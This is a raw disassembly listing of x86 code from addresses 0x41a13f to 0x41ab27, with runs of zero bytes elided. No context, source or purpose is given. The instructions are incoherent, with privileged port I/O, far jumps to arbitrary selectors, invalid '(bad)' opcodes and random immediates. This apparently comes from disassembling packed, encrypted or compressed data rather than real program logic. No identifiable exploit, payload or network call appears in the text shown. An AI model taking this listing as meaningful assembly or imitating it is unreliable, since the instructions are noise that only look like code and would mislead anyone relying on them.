  41a13f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a140:	xor    eax,0x72c18aa8
  41a145:	mov    dl,0xaa
  41a147:	push   esi
  41a148:	stos   DWORD PTR es:[edi],eax
  41a149:	jg     0x41a0f4
  41a14b:	loope  0x41a0f2
  41a14d:	push   ebp
  41a14e:	pop    ebx
  41a14f:	mov    eax,0x7378d928
  41a154:	mov    eax,0x7a4891bf
  41a159:	loop   0x41a1b1
  41a15b:	adc    BYTE PTR ds:0x379a0384,0x61
  41a162:	aam    0xf5
  41a164:	in     al,dx
  41a165:	fidivr WORD PTR [ecx+edx*2]
  41a168:	dec    ebp
  41a169:	xor    ecx,esp
  41a16b:	out    0x66,al
  41a16d:	jle    0x41a18e
  41a16f:	ss (bad) 
  41a172:	mov    edx,0xf8263115
  41a177:	dec    edx
  41a178:	or     eax,0x5522cc7b
  41a17d:	add    DWORD PTR [edi],edx
  41a17f:	jmp    0xe342:0xec75870c
  41a186:	out    dx,eax
  41a187:	xchg   BYTE PTR [edx-0x28],dh
  41a18a:	stos   DWORD PTR es:[edi],eax
  41a18b:	mov    bh,0x9c
  41a18d:	push   edi
  41a18e:	xlat   BYTE PTR ds:[ebx]
  41a18f:	jle    0x41a1bd
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	ror    ecx,cl
  41a202:	retf   0x26df
  41a205:	adc    eax,0x1050001
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	(bad)  
  41a20d:	shl    DWORD PTR [edx-0x16e3c209],1
  41a213:	retf   0xe553
  41a216:	in     eax,0x86
  41a218:	cmc    
  41a219:	jae    0x41a20f
  41a21b:	inc    ebx
  41a21c:	in     al,0x17
  41a21e:	mov    eax,0x8a6bd562
  41a223:	or     eax,0xf9083c35
  41a228:	mov    ch,0xeb
  41a22a:	out    0xec,eax
  41a22c:	jmp    0x4f266547
  41a231:	ds pushf 
  41a233:	mov    edx,0xd9151d65
  41a238:	retf   0x35af
  41a23b:	fiadd  WORD PTR [edx-0x5f10ac3c]
  41a241:	adc    cl,BYTE PTR [edx+0x2d]
  41a244:	and    dh,ah
  41a246:	inc    ebp
  41a247:	mov    bl,0xf6
  41a249:	mul    ah
  41a24b:	loope  0x41a268
  41a24d:	mov    ecx,0x978c3439
  41a252:	pushf  
  41a253:	or     ebp,DWORD PTR [esi+edi*1+0x53]
  41a257:	ins    DWORD PTR es:[edi],dx
  41a258:	sub    bh,BYTE PTR [ecx+0x64]
  41a25b:	adc    cl,al
  41a25d:	lds    edx,FWORD PTR [esi]
  41a25f:	xchg   edx,eax
  41a260:	mov    edi,0xf92d207c
  41a265:	inc    esp
  41a266:	mov    dl,0x1d
  41a268:	jo     0x41a227
  41a26a:	pushf  
  41a26b:	dec    edx
  41a26c:	mov    ebx,0xbbed5139
  41a271:	es pop esi
  41a273:	nop
  41a274:	push   eax
  41a275:	pop    ebp
  41a276:	ret    
  41a277:	ret    0xc9dd
  41a27a:	add    DWORD PTR [esi],eax
  41a27c:	into   
  41a27d:	add    esp,DWORD PTR [ecx+0x5defb809]
  41a283:	push   fs
  41a285:	cld    
  41a286:	inc    esp
  41a287:	retf   
  41a288:	in     eax,dx
  41a289:	adc    DWORD PTR [esi],0xfffffff8
  41a28c:	cmp    BYTE PTR [ebp-0x3759db25],bh
  41a292:	push   ss
  41a293:	rcr    DWORD PTR [esi-0x6dba37b7],0x28
  41a29a:	shl    BYTE PTR [edi+esi*1+0x1b],cl
  41a29e:	push   edx
  41a29f:	adc    DWORD PTR [ebx+0x40],ebp
  41a2a2:	sbb    DWORD PTR [ecx+0x7],0x2e3486d8
  41a2a9:	rcr    BYTE PTR [edx],0x12
  41a2ac:	mov    ebx,0x95971f29
  41a2b1:	mov    esp,ss
  41a2b3:	jbe    0x41a29b
  41a2b5:	loop   0x41a30b
  41a2b7:	lods   eax,DWORD PTR ds:[esi]
  41a2b8:	hlt    
  41a2b9:	shl    BYTE PTR [ecx+0x3304e393],1
  41a2bf:	sub    eax,0x5750ff43
  41a2c4:	add    DWORD PTR [ebx-0x8],edx
  41a2c7:	sbb    ecx,eax
  41a2c9:	dec    ebp
  41a2ca:	cmp    eax,0x8427fd32
  41a2cf:	dec    ecx
  41a2d0:	pop    eax
  41a2d1:	in     eax,dx
  41a2d2:	mov    eax,ds:0x40c19b4c
  41a2d7:	pop    edi
  41a2d8:	cvtpi2ps xmm7,QWORD PTR [edi+0x4a]
  41a2dc:	jne    0x41a2b1
  41a2de:	loope  0x41a261
  41a2e0:	dec    ebx
  41a2e1:	dec    ebx
  41a2e2:	fisubr DWORD PTR [esp+ebp*1-0xf]
  41a2e6:	test   al,0x23
  41a2e8:	pushf  
  41a2e9:	iret   
  41a2ea:	cmp    BYTE PTR [esi-0x64],0x8c
  41a2ee:	mov    esi,0x649b8952
  41a2f3:	xor    eax,0xcdb66ca2
  41a2f8:	iret   
  41a2f9:	retf   0x7796
  41a2fc:	pop    esi
  41a2fd:	dec    edi
  41a2fe:	loopne 0x41a36b
  41a300:	aam    0x1f
  41a302:	push   eax
  41a303:	fist   DWORD PTR [edx+ebx*8-0x64]
  41a307:	cs inc ecx
  41a309:	jmp    0xbac8:0x7853b183
  41a310:	jp     0x41a312
	...
  41a372:	add    BYTE PTR [eax],al
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	ret    
  41a381:	jo     0x41a3b5
  41a383:	loopne 0x41a3b0
  41a385:	push   ss
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0xf5000001
  41a38d:	or     dh,BYTE PTR [ecx]
  41a38f:	sub    ah,BYTE PTR [ebp+eiz*2-0x9]
  41a393:	stos   DWORD PTR es:[edi],eax
  41a394:	ror    BYTE PTR [esi-0x7b],0xc5
  41a398:	fbld   TBYTE PTR [ebx+0x12688b0b]
  41a39e:	test   ch,dl
  41a3a0:	repz mov ah,0x4a
  41a3a3:	cmp    al,0x54
  41a3a5:	aam    0x68
  41a3a7:	sbb    DWORD PTR [edi+edi*2+0x15],ebp
  41a3ab:	mov    ebp,0x7ddbb74d
  41a3b0:	in     eax,dx
  41a3b1:	rcl    DWORD PTR [edi],cl
  41a3b3:	(bad)  
  41a3b4:	dec    ecx
  41a3b5:	lahf   
  41a3b6:	sub    BYTE PTR cs:[ecx],dh
  41a3b9:	scas   eax,DWORD PTR es:[edi]
  41a3ba:	push   0x45
  41a3bc:	pop    eax
  41a3bd:	adc    dh,dh
  41a3bf:	ins    BYTE PTR es:[edi],dx
  41a3c0:	ss mov al,0x7a
  41a3c3:	cmp    ah,BYTE PTR [eax+0x35abc83a]
  41a3c9:	fistp  QWORD PTR [edx]
  41a3cb:	pusha  
  41a3cc:	je     0x41a375
  41a3ce:	sub    al,0x2a
  41a3d0:	je     0x41a358
  41a3d2:	xchg   ebx,esp
  41a3d4:	add    edi,DWORD PTR ds:0x38894de2
  41a3da:	iret   
  41a3db:	iret   
  41a3dc:	repz xchg ebp,eax
  41a3de:	xchg   esi,eax
  41a3df:	ins    BYTE PTR es:[edi],dx
  41a3e0:	add    DWORD PTR [esi-0xfdcc25a],0xe78fda09
  41a3ea:	rcl    cl,0xfc
  41a3ed:	jp     0x41a3bc
  41a3ef:	sbb    al,BYTE PTR [edi+0x4056cd90]
  41a3f5:	fucompp 
  41a3f7:	push   cs
  41a3f8:	daa    
  41a3f9:	inc    esp
  41a3fa:	mov    bl,0x6c
  41a3fc:	adc    eax,0x7b313f0
  41a401:	jp     0x41a431
  41a403:	inc    edi
  41a404:	adc    ebx,0x2c
  41a407:	stos   BYTE PTR es:[edi],al
  41a408:	jecxz  0x41a474
  41a40a:	and    DWORD PTR [edi-0x5214fe5c],0xffffffab
  41a411:	stos   DWORD PTR es:[edi],eax
  41a412:	sbb    DWORD PTR [esi],0xb689da72
  41a418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a419:	cmc    
  41a41a:	test   eax,0xeb33c93f
  41a41f:	fiadd  WORD PTR [esi-0x5c]
  41a422:	ins    BYTE PTR es:[edi],dx
  41a423:	lods   eax,DWORD PTR ds:[esi]
  41a424:	jp     0x41a3bd
  41a426:	mov    eax,ds:0x10fcb37f
  41a42b:	test   eax,0x6410e570
  41a430:	fs push ebx
  41a432:	sbb    ecx,edx
  41a434:	push   esi
  41a435:	push   0x14
  41a437:	out    dx,al
  41a438:	in     al,dx
  41a439:	dec    esi
  41a43a:	or     BYTE PTR fs:[ebx+eax*2+0x3e],ch
  41a43f:	es aas 
  41a441:	jmp    0x41a493
  41a443:	mov    ah,0x51
  41a445:	mov    al,ds:0xed4e1c59
  41a44a:	jge    0x41a469
  41a44c:	and    DWORD PTR [ebx-0x384ea6a],esp
  41a452:	mov    edi,DWORD PTR [ecx]
  41a454:	add    ecx,eax
  41a456:	test   DWORD PTR [ecx+0x517aa76b],esi
  41a45c:	popf   
  41a45d:	imul   ebp,DWORD PTR [ecx-0x3c0975fb],0x3c
  41a464:	mov    es,WORD PTR [edi]
  41a466:	inc    eax
  41a467:	int3   
  41a468:	data16 fdivr QWORD PTR [esi+esi*1+0x7dbe6e4]
  41a470:	mov    ss,WORD PTR [edi-0x2a]
  41a473:	out    0xe0,al
  41a475:	cmp    DWORD PTR [esi-0x43],esp
  41a478:	push   edx
  41a479:	mov    edx,0x74f7ca37
  41a47e:	fistp  DWORD PTR [ebp-0x3]
  41a481:	add    eax,0xd458e
  41a486:	lea    edi,[ebp-0x55383d08]
  41a48c:	les    ecx,FWORD PTR [edi-0x73]
  41a48f:	nop
  41a490:	aad    0x0
	...
  41a4f2:	add    BYTE PTR [eax],al
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	or     dh,BYTE PTR [ebx]
  41a502:	push   cs
  41a503:	out    dx,eax
  41a504:	xor    BYTE PTR [edi],dl
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0x12000001
  41a50d:	mov    ebx,DWORD PTR [ecx+0x3aab1cd6]
  41a513:	sbb    eax,DWORD PTR [eax]
  41a515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a516:	xor    al,0x3a
  41a518:	push   ecx
  41a519:	xor    al,BYTE PTR [eax]
  41a51b:	or     dl,BYTE PTR [eax+0x2960700d]
  41a521:	call   0x8f4d:0x299aa4ed
  41a528:	jmp    edx
  41a52a:	xor    ah,BYTE PTR [ecx]
  41a52c:	adc    bh,BYTE PTR [esi-0x337ce5bb]
  41a532:	add    al,0x2d
  41a534:	xchg   DWORD PTR [edx+0x36],ebx
  41a537:	sar    BYTE PTR [ebx],1
  41a539:	in     al,0x3e
  41a53b:	sub    ebx,DWORD PTR [ebp-0x3e]
  41a53e:	or     DWORD PTR [ebx+0x5b6e2dd7],ecx
  41a544:	and    BYTE PTR [esi-0x4b],ch
  41a547:	imul   DWORD PTR [ebp+0xc]
  41a54a:	inc    ebx
  41a54b:	ds dec eax
  41a54d:	arpl   WORD PTR [edx+0x5],cx
  41a550:	jp     0x41a51f
  41a552:	jnp    0x41a4eb
  41a554:	mov    ch,BYTE PTR [ecx+0x436b2b1]
  41a55a:	sar    BYTE PTR [ebp-0x18bd3234],1
  41a560:	or     bh,bl
  41a562:	test   BYTE PTR [ebp-0x60],dh
  41a565:	loop   0x41a568
  41a567:	inc    ebp
  41a568:	dec    eax
  41a569:	lods   al,BYTE PTR ds:[esi]
  41a56a:	repz xlat BYTE PTR ds:[ebx]
  41a56c:	or     al,0xad
  41a56e:	adc    edi,ebx
  41a570:	icebp  
  41a571:	mov    esp,ecx
  41a573:	repnz cmp ecx,ebp
  41a576:	jnp    0x41a5ac
  41a578:	mov    bh,0xd4
  41a57a:	leave  
  41a57b:	test   bl,cl
  41a57d:	lahf   
  41a57e:	mov    eax,0x335ec0c1
  41a583:	pop    esi
  41a584:	stc    
  41a585:	fdivrp st(1),st
  41a587:	inc    ebp
  41a588:	outs   dx,BYTE PTR ds:[esi]
  41a589:	adc    eax,0x283dc8cb
  41a58e:	adc    al,0xd5
  41a590:	sbb    al,0x32
  41a592:	out    0xf5,eax
  41a594:	stc    
  41a595:	out    dx,eax
  41a596:	push   ebx
  41a597:	stos   BYTE PTR es:[edi],al
  41a598:	rep lods al,BYTE PTR ds:[esi]
  41a59a:	jns    0x41a586
  41a59c:	cs shr esp,1
  41a59f:	xchg   edx,eax
  41a5a0:	(bad)  
  41a5a1:	and    esi,DWORD PTR [ecx-0x780fd9a2]
  41a5a7:	idiv   DWORD PTR [esi+0x77]
  41a5aa:	mov    ds:0xd1ec7ca6,al
  41a5af:	cmp    BYTE PTR [esi],ah
  41a5b1:	jnp    0x41a564
  41a5b3:	fs mov ch,0xaf
  41a5b6:	add    ebx,ecx
  41a5b8:	lods   eax,DWORD PTR ds:[esi]
  41a5b9:	sti    
  41a5ba:	cmc    
  41a5bb:	ins    DWORD PTR es:[edi],dx
  41a5bc:	mov    bh,0x3a
  41a5be:	push   edi
  41a5bf:	jl     0x41a63d
  41a5c1:	enter  0xc53b,0x59
  41a5c5:	(bad)  
  41a5c6:	or     al,0x4d
  41a5c8:	call   0xb199:0x17d130d9
  41a5cf:	cmc    
  41a5d0:	fs repz jge 0x41a5b5
  41a5d4:	jg     0x41a5ee
  41a5d6:	jle    0x41a63b
  41a5d8:	loope  0x41a62f
  41a5da:	xor    eax,0x7c644482
  41a5df:	arpl   WORD PTR [ebp+0x36],bp
  41a5e2:	and    ch,BYTE PTR [edx]
  41a5e4:	mov    WORD PTR [eax+0x64b18a18],ds
  41a5ea:	inc    eax
  41a5eb:	cmp    bl,BYTE PTR ss:[ecx]
  41a5ee:	in     eax,0x8f
  41a5f0:	enter  0xf53,0xa4
  41a5f4:	fisub  DWORD PTR [edx+0x71]
  41a5f7:	out    dx,al
  41a5f8:	mov    dl,0x83
  41a5fa:	lods   al,BYTE PTR ds:[esi]
  41a5fb:	xchg   ecx,eax
  41a5fc:	xor    eax,0x8fdb8a0f
  41a601:	sub    DWORD PTR [ebp-0x4e27c0fe],edi
  41a607:	adc    BYTE PTR [bx],ah
  41a60a:	or     cl,ah
  41a60c:	pop    ebx
  41a60d:	cmp    esi,ecx
  41a60f:	fwait
  41a610:	and    eax,DWORD PTR [eax]
	...
  41a672:	add    BYTE PTR [eax],al
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x1078a625
  41a682:	inc    ecx
  41a683:	pop    ebx
  41a684:	xor    eax,0x5000118
  41a689:	add    DWORD PTR [eax],eax
  41a68b:	add    al,ah
  41a68d:	sbb    eax,0x19ba7023
  41a692:	sub    bh,BYTE PTR ds:[edx]
  41a695:	rol    BYTE PTR [ebp-0x14],1
  41a698:	mov    ds:0x822a69c1,al
  41a69d:	stos   DWORD PTR es:[edi],eax
  41a69e:	(bad)  
  41a69f:	pop    esp
  41a6a0:	lahf   
  41a6a1:	cmp    cl,dl
  41a6a3:	ss mov bh,0x52
  41a6a6:	xchg   esp,eax
  41a6a7:	fsub   st(3),st
  41a6a9:	cmp    DWORD PTR [ecx],ebp
  41a6ab:	dec    esp
  41a6ac:	dec    eax
  41a6ad:	xchg   edi,eax
  41a6ae:	inc    esp
  41a6af:	jae    0x41a706
  41a6b1:	sbb    BYTE PTR [ebp-0x31],ch
  41a6b4:	jl     0x41a70f
  41a6b6:	xchg   esi,eax
  41a6b7:	pop    ss
  41a6b8:	push   es
  41a6b9:	mov    bl,0x1c
  41a6bb:	xor    bl,al
  41a6bd:	mov    ah,0x52
  41a6bf:	mov    WORD PTR [ebx+0x14],ds
  41a6c2:	das    
  41a6c3:	mov    al,0xe9
  41a6c5:	ins    BYTE PTR es:[edi],dx
  41a6c6:	rcr    DWORD PTR [ecx+eiz*8+0x58],1
  41a6ca:	imul   ecx,ebx,0x3dec570
  41a6d0:	cmp    DWORD PTR [edi],ebp
  41a6d2:	xchg   esp,eax
  41a6d3:	hlt    
  41a6d4:	push   esp
  41a6d5:	add    dh,bh
  41a6d7:	stos   BYTE PTR es:[edi],al
  41a6d8:	add    al,0x3a
  41a6da:	ds sbb eax,0x5387c5d0
  41a6e0:	stos   BYTE PTR es:[edi],al
  41a6e1:	jmp    0x3d0d334a
  41a6e6:	pop    ebx
  41a6e7:	js     0x41a6fe
  41a6e9:	out    0x4c,eax
  41a6eb:	out    dx,al
  41a6ec:	bound  ebx,QWORD PTR [eax-0x7e]
  41a6ef:	and    cl,dh
  41a6f1:	sbb    eax,0xfeef98f9
  41a6f6:	popa   
  41a6f7:	or     DWORD PTR [eax+edi*1+0x26],ecx
  41a6fb:	loopne 0x41a6d0
  41a6fd:	push   ds
  41a6fe:	aaa    
  41a6ff:	pusha  
  41a700:	adc    cl,BYTE PTR [edx]
  41a702:	out    0xd9,eax
  41a704:	int3   
  41a705:	sub    al,0x90
  41a707:	push   ds
  41a708:	les    ecx,FWORD PTR [ebx-0x1fb0b837]
  41a70e:	add    BYTE PTR [ecx-0x75298d06],bl
  41a714:	inc    edi
  41a715:	test   al,0x5e
  41a717:	and    al,0x97
  41a719:	sbb    al,0x81
  41a71b:	popa   
  41a71c:	retf   
  41a71d:	cmc    
  41a71e:	test   al,0x4a
  41a720:	cmp    DWORD PTR [esi-0x295b6e60],ebx
  41a726:	addr16 mov eax,ds:0x7bac
  41a72a:	lahf   
  41a72b:	shl    edi,0xe0
  41a72e:	mov    bl,0x2
  41a730:	push   ebp
  41a731:	call   0x94ccec1
  41a736:	xor    edi,DWORD PTR [eax-0x351454dc]
  41a73c:	out    0xae,al
  41a73e:	push   esi
  41a73f:	in     eax,0xf8
  41a741:	pop    ds
  41a742:	imul   ebp,ecx,0xffffff8f
  41a745:	scas   al,BYTE PTR es:[edi]
  41a746:	xor    dl,BYTE PTR [ebp+0x62e4e840]
  41a74c:	jge    0x41a770
  41a74e:	outs   dx,BYTE PTR ds:[esi]
  41a74f:	jge    0x41a6d7
  41a751:	jbe    0x41a732
  41a753:	lahf   
  41a754:	cwde   
  41a755:	jnp    0x41a7b4
  41a757:	xor    ebx,eax
  41a759:	cmp    esi,esi
  41a75b:	iret   
  41a75c:	dec    edi
  41a75d:	cmp    ebp,DWORD PTR [edi]
  41a75f:	in     eax,0x9e
  41a761:	ss adc al,0x97
  41a764:	xchg   esp,eax
  41a765:	ja     0x41a7c5
  41a767:	sbb    BYTE PTR [edx-0x153ac491],bh
  41a76d:	aas    
  41a76e:	out    dx,eax
  41a76f:	lahf   
  41a770:	(bad)  
  41a771:	imul   esi,DWORD PTR [eax],0x44
  41a774:	add    edx,DWORD PTR [ebx+0x55]
  41a777:	sub    DWORD PTR [ebp-0xe5bf773],eax
  41a77d:	mov    eax,0x44129bd4
  41a782:	std    
  41a783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a784:	mov    al,ds:0xcc5dfb86
  41a789:	cmp    dl,BYTE PTR [esi-0x22]
  41a78c:	in     eax,0x1f
  41a78e:	mov    ebp,0xc7fd
	...
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x935327ca,al
  41a801:	shl    DWORD PTR [edx],0x50
  41a804:	cmp    bl,BYTE PTR [ecx]
  41a806:	add    DWORD PTR [eax],eax
  41a808:	add    eax,0x7b000001
  41a80d:	call   0x2d387b1
  41a812:	mov    ch,0xcb
  41a814:	xlat   BYTE PTR ds:[ebx]
  41a815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a816:	jecxz  0x41a807
  41a818:	les    ebx,FWORD PTR [ecx-0x1e]
  41a81b:	xor    eax,esi
  41a81d:	push   es
  41a81e:	ja     0x41a843
  41a820:	les    esp,FWORD PTR [ebx+0x79f2d7ef]
  41a826:	into   
  41a827:	or     DWORD PTR [esp+edx*4-0x405273db],0xffffffcc
  41a82f:	mov    ah,0x79
  41a831:	nop
  41a832:	out    0xae,eax
  41a834:	jnp    0x41a7b6
  41a836:	or     DWORD PTR [edi-0x15],esi
  41a839:	adc    BYTE PTR [eax-0x55e95592],bl
  41a83f:	daa    
  41a840:	icebp  
  41a841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a842:	xchg   esi,eax
  41a843:	out    dx,eax
  41a844:	sbb    BYTE PTR [edx],bl
  41a846:	pop    ebp
  41a847:	fwait
  41a848:	rcr    BYTE PTR [ebx+0x6c6dc4b9],1
  41a84e:	mov    ebp,0x32f267ff
  41a853:	add    esi,0xffffffa8
  41a856:	mov    ds,esp
  41a858:	out    dx,eax
  41a859:	inc    esi
  41a85a:	xchg   BYTE PTR [ebx],dh
  41a85c:	hlt    
  41a85d:	in     al,0x42
  41a85f:	arpl   WORD PTR [esi+0x229e831e],dx
  41a865:	aaa    
  41a866:	fmulp  st(6),st
  41a868:	pop    ecx
  41a869:	ficomp DWORD PTR [esp+edi*2]
  41a86c:	dec    esp
  41a86d:	call   FWORD PTR [edi+0x13be33a9]
  41a873:	test   DWORD PTR [esi+0x45],ebp
  41a876:	jle    0x41a838
  41a878:	cmp    DWORD PTR [ebp+0x1e8180e9],eax
  41a87e:	ficom  WORD PTR [edi]
  41a880:	rcl    cl,cl
  41a882:	fsub   DWORD PTR [ebx]
  41a884:	jg     0x41a828
  41a886:	aam    0x2d
  41a888:	cdq    
  41a889:	loope  0x41a814
  41a88b:	xor    al,0x99
  41a88d:	ret    
  41a88e:	mov    eax,0x9975bfc5
  41a893:	push   esp
  41a894:	add    BYTE PTR [ebx+0x660df1c0],ch
  41a89a:	mov    esp,edi
  41a89c:	push   edi
  41a89d:	fmul   DWORD PTR [edi+esi*8]
  41a8a0:	popa   
  41a8a1:	jne    0x41a8eb
  41a8a3:	gs ret 
  41a8a5:	fdivp  st(3),st
  41a8a7:	leave  
  41a8a8:	(bad)  
  41a8a9:	in     eax,dx
  41a8aa:	sub    al,BYTE PTR [edx+ebp*1+0x46]
  41a8ae:	out    dx,eax
  41a8af:	cmp    bl,BYTE PTR [ecx+0x6e]
  41a8b2:	aad    0xea
  41a8b4:	sar    DWORD PTR [ebp+edi*2+0x1a],1
  41a8b8:	cmp    bl,BYTE PTR [eax+0x4e01e4df]
  41a8be:	ret    0xb699
  41a8c1:	pop    ss
  41a8c2:	(bad)  
  41a8c3:	fisub  WORD PTR [ebx+esi*4]
  41a8c6:	mov    cl,0x77
  41a8c8:	adc    bh,BYTE PTR [ebp+0x74d76e24]
  41a8ce:	mov    ebp,0xe262d642
  41a8d3:	in     al,dx
  41a8d4:	or     eax,0x99b4d970
  41a8d9:	data16 ins BYTE PTR es:[edi],dx
  41a8db:	std    
  41a8dc:	sub    BYTE PTR [esi],0xff
  41a8df:	sbb    al,0xef
  41a8e1:	and    al,0xc1
  41a8e3:	inc    ebx
  41a8e4:	shl    BYTE PTR [ecx+0x32],0x7c
  41a8e8:	jmp    0x2c7f:0x8326d93b
  41a8ef:	fisttp WORD PTR [ecx-0x4c]
  41a8f2:	mov    al,al
  41a8f4:	and    DWORD PTR [eax+0x1a],0xb77ac5a8
  41a8fb:	mov    BYTE PTR [ebp-0x3a894149],bl
  41a901:	cmc    
  41a902:	rcr    DWORD PTR [ebx-0x2d],1
  41a905:	jae    0x41a8bb
  41a907:	mov    BYTE PTR [esi-0x1e],al
  41a90a:	fs mov dh,0xaf
  41a90d:	js     0x41a910
  41a90f:	push   es
  41a910:	mov    al,0x0
	...
  41a972:	add    BYTE PTR [eax],al
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	xchg   ebx,eax
  41a981:	jp     0x41a938
  41a983:	xor    bh,BYTE PTR [edi]
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0xce000001,al
  41a98d:	xor    BYTE PTR [ebx],dh
  41a98f:	jle    0x41a954
  41a991:	sahf   
  41a992:	xchg   ecx,eax
  41a993:	enter  0x1f52,0xcf
  41a997:	sub    ah,BYTE PTR [eax]
  41a999:	sub    eax,0x216ee2d4
  41a99e:	mov    bl,0x3c
  41a9a0:	fwait
  41a9a1:	out    0x9b,eax
  41a9a3:	data16 stos BYTE PTR es:[edi],al
  41a9a5:	pop    ss
  41a9a6:	imul   ebx,DWORD PTR [esi],0xbb1a3eb8
  41a9ac:	scas   eax,DWORD PTR es:[edi]
  41a9ad:	dec    edi
  41a9ae:	(bad)  
  41a9af:	pop    edi
  41a9b0:	test   DWORD PTR [edi-0x63],0xdad976ae
  41a9b7:	dec    ecx
  41a9b8:	xchg   ebp,eax
  41a9b9:	cmp    al,BYTE PTR ds:0x1e44d4fc
  41a9bf:	popf   
  41a9c0:	in     eax,dx
  41a9c1:	loop   0x41aa05
  41a9c3:	push   ds
  41a9c4:	add    edi,DWORD PTR [edx-0x1f04e15b]
  41a9ca:	fldcw  WORD PTR [esi+0x7e482c18]
  41a9d0:	add    BYTE PTR ds:0xc559246b,0xef
  41a9d7:	mov    ds,WORD PTR [edi-0x5801bef5]
  41a9dd:	je     0x41aa1f
  41a9df:	outs   dx,DWORD PTR ds:[esi]
  41a9e0:	ja     0x41a9c3
  41a9e2:	dec    esp
  41a9e3:	int    0x6a
  41a9e5:	ss scas al,BYTE PTR es:[edi]
  41a9e7:	jmp    0x41a9a1
  41a9e9:	dec    edx
  41a9ea:	sub    edx,ebx
  41a9ec:	xor    DWORD PTR [esi-0x42],edi
  41a9ef:	iret   
  41a9f0:	imul   ebp,DWORD PTR [edx-0x80],0x14
  41a9f4:	adc    al,BYTE PTR [ecx]
  41a9f6:	pop    esi
  41a9f7:	mov    ?,edx
  41a9f9:	cmp    eax,0x1619e4d2
  41a9fe:	mov    DWORD PTR [ebx],esi
  41aa00:	xor    ah,BYTE PTR [edi-0x12]
  41aa03:	loopne 0x41aa53
  41aa05:	mov    dl,0x94
  41aa07:	jne    0x41a9cb
  41aa09:	out    0xf9,eax
  41aa0b:	out    0x8d,eax
  41aa0d:	or     al,0xbb
  41aa0f:	in     eax,dx
  41aa10:	(bad)  
  41aa11:	mov    ebx,0xa2cebd8b
  41aa16:	ss ret 0xef9d
  41aa1a:	cmp    al,0xa
  41aa1c:	xchg   ebx,eax
  41aa1d:	push   ebp
  41aa1e:	into   
  41aa1f:	test   eax,0xba16cc71
  41aa24:	fldcw  WORD PTR [edi+0x46410aff]
  41aa2a:	sbb    ebp,DWORD PTR [ebx]
  41aa2c:	into   
  41aa2d:	fnstenv [esi+0x2]
  41aa30:	(bad)  
  41aa31:	sahf   
  41aa32:	test   al,0x95
  41aa34:	daa    
  41aa35:	or     BYTE PTR [ebp+0x1b33a15],al
  41aa3b:	iret   
  41aa3c:	ror    BYTE PTR [esi],1
  41aa3e:	cmp    ch,BYTE PTR [esi]
  41aa40:	pop    edi
  41aa41:	pusha  
  41aa42:	cmp    esi,DWORD PTR [eax+0x66a6277c]
  41aa48:	mov    edx,0x7eb77760
  41aa4d:	push   edi
  41aa4e:	lods   al,BYTE PTR ds:[esi]
  41aa4f:	jge    0x41aa40
  41aa51:	xchg   ecx,eax
  41aa52:	and    eax,0xa2dbe720
  41aa57:	mov    ds:0x7562ff58,eax
  41aa5c:	sbb    al,0x56
  41aa5e:	mov    cl,0xb7
  41aa60:	push   esi
  41aa61:	test   al,0xb
  41aa63:	cmc    
  41aa64:	xchg   ecx,eax
  41aa65:	cld    
  41aa66:	dec    ebx
  41aa67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa68:	ss call 0x982e:0xa96f316b
  41aa70:	ins    BYTE PTR es:[edi],dx
  41aa71:	xor    BYTE PTR [edx+0x4a0c0c85],dl
  41aa77:	jmp    0xb4d5:0xf7698221
  41aa7e:	xchg   ebx,eax
  41aa7f:	pop    ebp
  41aa80:	inc    esi
  41aa81:	es pop esi
  41aa83:	inc    edx
  41aa84:	mov    ebx,0xb73eaced
  41aa89:	cld    
  41aa8a:	pop    ss
  41aa8b:	jg     0x41aae4
  41aa8d:	cmp    BYTE PTR [edx+0x17],al
  41aa90:	js     0x41aa92
	...
  41aaf2:	add    BYTE PTR [eax],al
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	aas    
  41ab01:	jp     0x41aafc
  41ab03:	daa    
  41ab04:	inc    esp
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0x6b000001,al
  41ab0d:	pop    edi
  41ab0e:	ja     0x41ab4c
  41ab10:	jp     0x41ab6a
  41ab12:	aaa    
  41ab13:	scas   eax,DWORD PTR es:[edi]
  41ab14:	dec    ebx
  41ab15:	xor    ch,dl
  41ab17:	fcomp  st(5)
  41ab19:	push   eax
  41ab1a:	dec    esi
  41ab1b:	pop    edi
  41ab1c:	mov    eax,ds:0xac6ebb7a
  41ab21:	loopne 0x41aac7
  41ab23:	jnp    0x41ab9c
  41ab25:	rol    eax,1
  41ab27:	sbb    eax,esp
